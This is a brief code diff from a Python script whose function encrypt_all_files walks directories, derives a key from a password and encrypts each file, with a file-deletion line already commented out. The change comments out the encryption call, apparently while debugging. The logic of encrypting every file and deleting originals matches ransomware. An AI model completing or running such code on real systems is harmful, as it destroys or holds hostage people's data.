@@ -44,7 +44,7 @@ def encrypt_all_files():
                     key = SHA256.new(password.encode('utf-8')).digest()  # generates a 256bit key from password
                     filepath = os.path.abspath(os.path.join(root, filename))
                     print("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
-                    encrypt_file(key, filename, filepath)  # calls the encrypt function
+                    # encrypt_file(key, filename, filepath)  # calls the encrypt function
                     # os.remove(filepath)  # deletes the file
                     break
                     print("bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb")
